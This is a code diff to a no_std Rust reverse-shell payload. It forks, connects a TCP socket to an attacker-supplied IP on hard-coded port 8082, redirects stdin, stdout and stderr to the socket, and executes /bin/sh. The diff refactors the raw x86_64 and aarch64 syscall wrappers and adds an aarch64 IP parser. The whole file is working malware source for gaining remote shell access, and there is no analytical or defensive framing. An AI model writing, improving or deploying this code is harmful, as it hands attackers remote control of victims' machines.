@@ -2,7 +2,7 @@
 #![no_std]
 use core::arch::asm;
 
-const PORT: &str = core::env!("PORT");
+const PORT: u16 = 8082;
 const IP: &str = core::env!("IP");
 
 #[cfg(target_arch = "x86_64")]
@@ -48,69 +48,69 @@ struct in_addr {
     s_addr: u32,
 }
 
+fn syscall3(syscall: usize, arg1: usize, arg2: usize, arg3: usize) -> isize {
+    let ret: isize;
+    #[cfg(target_arch = "x86_64")]
+    unsafe {
+        asm!(
+            "syscall",
+            in("rax") syscall,
+            in("rdi") arg1,
+            in("rsi") arg2,
+            in("rdx") arg3,
+            out("rcx") _,
+            out("r11") _,
+            lateout("rax") ret,
+            options(nostack),
+        );
+    }
+    #[cfg(target_arch = "aarch64")]
+    unsafe {
+        asm!(
+            "svc #0",
+            in("x8") syscall,
+            in("x0") arg1,
+            in("x1") arg2,
+            in("x2") arg3,
+            lateout("x0") ret,
+            options(nostack)
+        );
+    };
+    ret
+}
+fn sys_dup3(arg1: usize, arg2: usize, arg3: isize) -> usize {
+    let ret: usize;
+    #[cfg(target_arch = "x86_64")]
+    unsafe {
+        asm!(
+            "syscall",
+            in("rax") SYS_DUP3,
+            in("rdi") arg1,
+            in("rsi") arg2,
+            in("rdx") arg3,
+            out("rcx") _,
+            out("r11") _,
+            lateout("rax") ret,
+            options(nostack),
+        );
+    }
+
+    #[cfg(target_arch = "aarch64")]
+    unsafe {
+        asm!(
+            "svc #0",
+            in("x8") SYS_DUP3,
+            in("x0") arg1,
+            in("x1") arg2,
+            in("x2") arg3,
+            lateout("x0") ret,
+            options(nostack)
+        );
+    }
+    ret
+}
+
 #[cfg(target_arch = "x86_64")]
-unsafe fn syscall3(syscall: usize, arg1: usize, arg2: usize, arg3: usize) -> usize {
-    let ret: usize;
-    asm!(
-        "syscall",
-        in("rax") syscall,
-        in("rdi") arg1,
-        in("rsi") arg2,
-        in("rdx") arg3,
-        out("rcx") _,
-        out("r11") _,
-        lateout("rax") ret,
-        options(nostack),
-    );
-    ret
-}
-
-#[cfg(target_arch = "aarch64")]
-unsafe fn syscall3(syscall: usize, arg1: usize, arg2: usize, arg3: usize) -> usize {
-    let ret: usize;
-    asm!(
-        "svc #0",
-        in("x8") syscall,
-        in("x0") arg1,
-        in("x1") arg2,
-        in("x2") arg3,
-        lateout("x0") ret,
-        options(nostack)
-    );
-    ret
-}
-
-#[cfg(target_arch = "x86_64")]
-unsafe fn sys_dup3(arg1: usize, arg2: usize, arg3: isize) -> usize {
-    let ret: usize;
-    asm!(
-        "syscall",
-        in("rax") SYS_DUP3,
-        in("rdi") arg1,
-        in("rsi") arg2,
-        in("rdx") arg3,
-        out("rcx") _,
-        out("r11") _,
-        lateout("rax") ret,
-        options(nostack),
-    );
-    ret
-}
-#[cfg(target_arch = "aarch64")]
-unsafe fn sys_dup3(arg1: usize, arg2: usize, arg3: isize) -> usize {
-    let ret: usize;
-    asm!(
-        "svc #0",
-        in("x8") SYS_DUP3,
-        in("x0") arg1,
-        in("x1") arg2,
-        in("x2") arg3,
-        lateout("x0") ret,
-        options(nostack)
-    );
-    ret
-}
-
 fn ip_str_to_beu32(ipv4_str: &str) -> u32 {
     let ip_it = ipv4_str.split('.');
     let mut r = [0u8; 4];
@@ -123,7 +123,34 @@ fn ip_str_to_beu32(ipv4_str: &str) -> u32 {
     res |= r[3] as u32;
     res.to_be()
 }
+#[cfg(target_arch = "aarch64")]
+fn ip_str_to_beu32(ipv4_str: &str) -> u32 {
+    //simpler version doesnt work in aarch64 , due to iterator (needs memcmp, memcpy, etc...)
+    let ipp = ipv4_str.as_bytes();
+    let mut current = 0u8;
+    let mut byte_idx = 0;
+    let mut r = [0u8; 4];
+    for b in ipp {
+        match b {
+            b'0'..=b'9' => {
+                current = current * 10 + b - b'0'; // substract b'0' to have u8 numeric value of b
+            }
+            b'.' => {
+                r[byte_idx] = current;
+                byte_idx += 1;
+                current = 0;
+            }
+            _ => {}
+        }
+    }
+    r[byte_idx] = current;
 
+    let mut res = (r[0] as u32) << 24;
+    res |= (r[1] as u32) << 16;
+    res |= (r[2] as u32) << 8;
+    res |= r[3] as u32;
+    res.to_be()
+}
 enum ForkResult {
     Parent(u32),
     Child,
@@ -187,41 +214,43 @@ fn fork() -> Result<ForkResult, i32> {
 }
 
 #[no_mangle]
-fn _start() -> ! {
+fn _start() {
     match fork() {
-        Ok(ForkResult::Parent(child_pid)) => unsafe { exit(0) },
+        Ok(ForkResult::Parent(_)) => exit(0),
         Ok(ForkResult::Child) => {
-            let shell: &[u8] = b"/bin/sh\0";
+            let shell = *b"/bin/sh\0";
             let argv: [*const u8; 2] = [shell.as_ptr(), core::ptr::null()];
             let ip: u32 = ip_str_to_beu32(IP);
             let socket_addr = sockaddr_in {
                 sin_family: AF_INET as u16,
-                sin_port: PORT.parse::<u16>().unwrap().to_be(),
+                sin_port: PORT.to_be(),
                 sin_addr: in_addr { s_addr: ip },
                 sin_zero: [0; 8],
             };
             let socket_addr_len = core::mem::size_of::<sockaddr_in>();
-            unsafe {
-                let socket_fd = syscall3(SYS_SOCKET, AF_INET, SOCK_STREAM, IPPROTO_IP);
-                syscall3(
-                    SYS_CONNECT,
-                    socket_fd,
-                    &socket_addr as *const sockaddr_in as usize,
-                    socket_addr_len as usize,
-                );
-                sys_dup3(socket_fd, STDIN, 0);
-                sys_dup3(socket_fd, STDOUT, 0);
-                sys_dup3(socket_fd, STDERR, 0);
-                syscall3(
-                    SYS_EXECVE,
-                    shell.as_ptr() as usize,
-                    argv.as_ptr() as usize,
-                    0,
-                );
-                exit(0)
+
+            let socket_fd = syscall3(SYS_SOCKET, AF_INET, SOCK_STREAM, IPPROTO_IP);
+            if socket_fd < 0 {
+                panic!("error");
             }
+            syscall3(
+                SYS_CONNECT,
+                socket_fd as usize,
+                &socket_addr as *const sockaddr_in as usize,
+                socket_addr_len as usize,
+            );
+            sys_dup3(socket_fd as usize, STDIN, 0);
+            sys_dup3(socket_fd as usize, STDOUT, 0);
+            sys_dup3(socket_fd as usize, STDERR, 0);
+            syscall3(
+                SYS_EXECVE,
+                shell.as_ptr() as usize,
+                argv.as_ptr() as usize,
+                0,
+            );
         }
-        Err(errno) => loop {},
+
+        Err(_) => loop {},
     }
 }
 #[panic_handler]
